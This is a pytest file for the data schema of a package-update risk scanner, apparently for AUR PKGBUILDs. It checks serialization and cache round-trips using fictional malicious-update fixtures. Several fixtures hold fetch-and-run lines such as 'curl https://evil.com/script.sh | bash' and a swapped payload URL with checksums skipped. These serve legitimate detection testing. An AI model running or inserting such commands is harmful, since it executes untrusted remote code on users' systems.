import json

from trustsight.schema import (
    DiffSummary,
    ExecutionChanges,
    NoveltyContext,
    PackageFact,
    ScoreEntry,
    SourceChanges,
    fact_from_dict,
    fact_to_dict,
)


def test_diff_summary_defaults():
    ds = DiffSummary()
    assert ds.lines_added == 0
    assert ds.lines_removed == 0
    assert ds.files_changed == []


def test_diff_summary_custom():
    ds = DiffSummary(lines_added=42, lines_removed=7, files_changed=["PKGBUILD", "spotify.install"])
    assert ds.lines_added == 42
    assert ds.lines_removed == 7
    assert "PKGBUILD" in ds.files_changed


def test_source_changes_defaults():
    sc = SourceChanges()
    assert sc.added_urls == []
    assert sc.removed_urls == []
    assert sc.checksum_behavior == ""


def test_source_changes_full():
    sc = SourceChanges(
        added_urls=["https://example.com/a.tar.gz"],
        removed_urls=["https://old.com/b.tar.gz"],
        checksum_behavior="changed_from_sha256_to_skip",
    )
    assert len(sc.added_urls) == 1
    assert len(sc.removed_urls) == 1
    assert "skip" in sc.checksum_behavior


def test_execution_changes_defaults():
    ec = ExecutionChanges()
    assert ec.resolved_commands == []
    assert ec.suspicious_patterns_detected == []
    assert ec.unresolved_patterns == []


def test_execution_changes_full():
    ec = ExecutionChanges(
        resolved_commands=["curl -s http://evil.com/hook.sh | bash"],
        suspicious_patterns_detected=["R001", "H001"],
        unresolved_patterns=["_url=$(curl ...)"],
    )
    assert len(ec.resolved_commands) == 1
    assert "R001" in ec.suspicious_patterns_detected


def test_novelty_context_defaults():
    nc = NoveltyContext()
    assert nc.url_first_seen_globally is False
    assert nc.url_first_seen_in_this_package is False
    assert nc.maintainer_first_seen_for_this_package is False


def test_novelty_context_all_true():
    nc = NoveltyContext(
        url_first_seen_in_this_package=True,
        url_first_seen_globally=True,
        maintainer_first_seen_for_this_package=True,
    )
    assert all([nc.url_first_seen_globally, nc.url_first_seen_in_this_package, nc.maintainer_first_seen_for_this_package])


def test_score_entry():
    se = ScoreEntry(rule_id="R001", severity="CRITICAL", weight=40, reason="curl | bash")
    assert se.rule_id == "R001"
    assert se.weight == 40
    assert "curl" in se.reason


def test_score_entry_zero_weight():
    se = ScoreEntry(rule_id="INFO", severity="INFO", weight=0, reason="informational")
    assert se.weight == 0


def test_package_fact_defaults():
    pf = PackageFact()
    assert pf.package_name == ""
    assert pf.final_score == 0
    assert isinstance(pf.diff_summary, DiffSummary)
    assert isinstance(pf.score_breakdown, list)
    assert pf.maintainer_changed is False


def test_package_fact_full():
    pf = PackageFact(
        package_name="spotify",
        old_version="1.2.3",
        new_version="1.2.4",
        old_commit="abc123",
        new_commit="def456",
        maintainer_changed=True,
        previous_maintainer="trusteddev",
        current_maintainer="newcomer",
        final_score=85,
    )
    assert pf.package_name == "spotify"
    assert pf.old_version == "1.2.3"
    assert pf.maintainer_changed is True
    assert pf.final_score == 85


def test_fact_to_dict():
    fact = PackageFact(
        package_name="testpkg",
        new_version="1.0",
        diff_summary=DiffSummary(lines_added=10, files_changed=["PKGBUILD"]),
        final_score=50,
        score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25, reason="test")],
    )
    d = fact_to_dict(fact)
    assert d["package_name"] == "testpkg"
    assert d["new_version"] == "1.0"
    assert d["final_score"] == 50
    assert d["diff_summary"]["lines_added"] == 10
    assert d["score_breakdown"][0]["rule_id"] == "R001"


def test_fact_to_dict_full():
    fact = PackageFact(
        package_name="brave-bin",
        old_version="1.0.0",
        new_version="2.0.0",
        maintainer_changed=True,
        previous_maintainer="alice",
        current_maintainer="mallory",
        diff_summary=DiffSummary(lines_added=50, lines_removed=10, files_changed=["PKGBUILD"]),
        source_changes=SourceChanges(
            added_urls=["https://evil.com/payload.tar.gz"],
            removed_urls=["https://brave.com/brave.tar.gz"],
            checksum_behavior="changed_from_sha256_to_skip",
        ),
        source_buckets={"https://evil.com/payload.tar.gz": "unknown"},
        execution_changes=ExecutionChanges(
            resolved_commands=["curl https://evil.com/script.sh | bash"],
            suspicious_patterns_detected=["R001"],
        ),
        novelty_context=NoveltyContext(url_first_seen_globally=True),
        score_breakdown=[ScoreEntry(rule_id="R001", severity="CRITICAL", weight=40, reason="curl | bash")],
        final_score=85,
    )
    d = fact_to_dict(fact)
    assert d["package_name"] == "brave-bin"
    assert d["maintainer_changed"] is True
    assert d["source_changes"]["checksum_behavior"] == "changed_from_sha256_to_skip"
    assert d["novelty_context"]["url_first_seen_globally"] is True
    assert d["final_score"] == 85
    assert d["source_buckets"]["https://evil.com/payload.tar.gz"] == "unknown"
    assert len(d["execution_changes"]["resolved_commands"]) == 1


def test_comparison_base_roundtrips_through_storage():
    fact = PackageFact(
        package_name="firefox",
        new_version="100.0",
        comparison_base="parent",
        final_score=0,
    )
    restored = fact_from_dict(fact_to_dict(fact))
    assert restored.comparison_base == "parent"
    older = fact_to_dict(PackageFact(package_name="old", new_version="1.0"))
    del older["comparison_base"]
    assert fact_from_dict(older).comparison_base == ""


def test_fact_to_dict_roundtrip():
    fact = PackageFact(
        package_name="firefox",
        new_version="100.0",
        diff_summary=DiffSummary(lines_added=5, files_changed=["PKGBUILD"]),
        final_score=0,
    )
    d = fact_to_dict(fact)
    assert d["package_name"] == "firefox"
    assert d["diff_summary"]["lines_added"] == 5
    assert d["diff_summary"]["lines_removed"] == 0
    assert d["source_changes"]["added_urls"] == []
    assert d["execution_changes"]["resolved_commands"] == []


def test_fact_to_dict_json_serializable():
    fact = PackageFact(
        package_name="test",
        new_version="1.0",
        score_breakdown=[ScoreEntry(rule_id="R001", severity="HIGH", weight=25, reason="ok")],
        final_score=25,
    )
    json_str = json.dumps(fact_to_dict(fact))
    loaded = json.loads(json_str)
    assert loaded["package_name"] == "test"
    assert loaded["final_score"] == 25


def test_fact_from_dict_roundtrip():
    """The review cache (#20) serves `fact_from_dict(fact_to_dict(f))`, so the
    round-trip must be lossless for everything a report reads."""
    from trustsight.depth import DependencyReport
    from trustsight.ioc_baseline import IocMatch
    from trustsight.schema import fact_from_dict

    fact = PackageFact(
        package_name="brave-bin",
        old_version="1.0.0",
        new_version="2.0.0",
        old_commit="abc123",
        new_commit="def456",
        maintainer_changed=True,
        previous_maintainer="alice",
        current_maintainer="mallory",
        pkgver_changed=True,
        pkgver_old="1.0.0",
        pkgver_new="2.0.0",
        version_moved=True,
        version_comparison="aur_ahead",
        temporal_source="git_commit",
        diff_summary=DiffSummary(
            lines_added=50, lines_removed=10, files_changed=["PKGBUILD"],
            file_changes=[{"path": "PKGBUILD", "status": "modified"}],
        ),
        source_changes=SourceChanges(
            added_urls=["https://evil.com/payload.tar.gz"],
            removed_urls=["https://brave.com/brave.tar.gz"],
            checksum_behavior="changed_from_sha256_to_skip",
        ),
        source_buckets={"https://evil.com/payload.tar.gz": "unknown"},
        execution_changes=ExecutionChanges(
            resolved_commands=["curl https://evil.com/script.sh | bash"],
            suspicious_patterns_detected=["R001"],
            unresolved_patterns=["_url=$(...)"],
        ),
        novelty_context=NoveltyContext(url_first_seen_globally=True),
        first_seen=False,
        suppressed_rules=[{"rule_id": "R099", "severity": "MEDIUM",
                           "override_reason": "known", "override_package": None}],
        diff_truncated=True,
        scan_truncated=True,
        tree_analyzed=True,
        changes=["pkgver 1.0.0 -> 2.0.0"],
        dependency_changes={"depends": ["demo-aur-lib"]},
        coverage_gaps=["diff_truncated", "tree_not_analyzed"],
        carried_coverage_gaps=["tree_not_analyzed"],
        unresolved_sources=["source=(\"$(...)\")"],
        risk="High",
        score_breakdown=[ScoreEntry(
            rule_id="R001", severity="CRITICAL", weight=40, reason="curl | bash",
            params={"cmd": "curl"}, template="{cmd} pipes to a shell",
            evidence={"match": "curl x | bash"}, file="PKGBUILD", line=7,
        )],
        final_score=85,
        ioc_matches=[IocMatch(
            type="domain", value="evil.com", source="test-baseline",
            confidence="high", provenance="manual", campaign="test",
            added="2026-01-01", surface="source", line=3, expired=False,
        )],
        dependencies=[DependencyReport(
            name="demo-aur-lib", depth=1, score=10, risk="Low",
            risk_label="Low", finding_count=1, coverage_gaps=("diff_truncated",),
            via="depends", parent="brave-bin",
        )],
        depth_truncated=True,
        depth_note="cut short",
        depth=2,
    )
    loaded = fact_from_dict(json.loads(json.dumps(fact_to_dict(fact))))
    assert loaded is not None
    assert fact_to_dict(loaded) == fact_to_dict(fact)
    assert loaded.score_breakdown[0].line == 7
    assert loaded.ioc_matches[0].value == "evil.com"
    assert loaded.dependencies[0].coverage_gaps == ("diff_truncated",)
    assert loaded.carried_coverage_gaps == ["tree_not_analyzed"]
    assert loaded.depth == 2
    assert loaded.cached is False


def test_fact_from_dict_rejects_rows_it_cannot_serve():
    """A row predating a key the round-trip needs is a cache miss, not an error."""
    from trustsight.schema import fact_from_dict

    assert fact_from_dict(None) is None
    assert fact_from_dict("fact") is None
    assert fact_from_dict({}) is None

    d = fact_to_dict(PackageFact(package_name="demo"))
    del d["coverage_gaps"]
    assert fact_from_dict(d) is None

    d = fact_to_dict(PackageFact(package_name="demo"))
    d["diff_summary"] = "not-a-dict"
    assert fact_from_dict(d) is None
